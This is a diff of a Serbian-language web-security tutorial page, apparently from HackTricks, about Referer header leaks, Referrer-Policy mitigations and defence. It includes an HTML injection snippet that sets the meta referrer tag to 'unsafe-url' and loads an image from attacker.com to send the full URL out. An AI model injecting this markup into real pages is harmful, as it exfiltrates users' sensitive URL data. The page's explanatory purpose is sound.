@@ -1,16 +1,18 @@
+# Zanimljiv HTTP
+
 {{#include ../banners/hacktricks-training.md}}
 
-# Referrer headers and policy
+## Referrer zaglavlja i politika
 
-Referrer je header koji koriste pregledači da označe koja je bila prethodna stranica koja je posetjena.
+Referrer je zaglavlje koje browseri koriste da naznače koja je stranica prethodno posećena.
 
-## Osetljive informacije otkrivene
+### Leak osetljivih informacija
 
-Ako se u nekom trenutku unutar web stranice bilo koja osetljiva informacija nalazi u GET zahtevima, ako stranica sadrži linkove ka spoljnim izvorima ili napadač može da natera/predloži (socijalno inženjerstvo) korisniku da poseti URL koji kontroliše napadač. To bi moglo omogućiti eksfiltraciju osetljivih informacija unutar poslednjeg GET zahteva.
+Ako se u nekom trenutku unutar web stranice bilo koja osetljiva informacija nalazi u parametrima GET zahteva, ako stranica sadrži linkove ka eksternim izvorima ili napadač može da navede/predloži (socijalnim inženjeringom) korisniku da poseti URL pod kontrolom napadača, mogao bi da eksfiltruje osetljive informacije iz poslednjeg GET zahteva.
 
-## Mitigacija
+### Mitigacija
 
-Možete naterati pregledač da prati **Referrer-policy** koja bi mogla **izbeći** slanje osetljivih informacija drugim web aplikacijama:
+Možete naterati browser da prati **Referrer-policy**, čime se može **sprečiti** slanje osetljivih informacija drugim web aplikacijama:
 ```
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
@@ -21,15 +23,15 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
-## Counter-Mitigation
+### Protivmere
 
-Možete prepisati ovo pravilo koristeći HTML meta tag (napadač treba da iskoristi i HTML injekciju):
+Ovo pravilo možete zaobići pomoću HTML meta taga (napadač mora da iskoristi HTML injection):
 ```html
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
 ## Odbrana
 
-Nikada ne stavljajte osetljive podatke unutar GET parametara ili putanja u URL-u.
+Nikada ne stavljajte osetljive podatke u GET parametre ili putanje u URL-u.
 
 {{#include ../banners/hacktricks-training.md}}
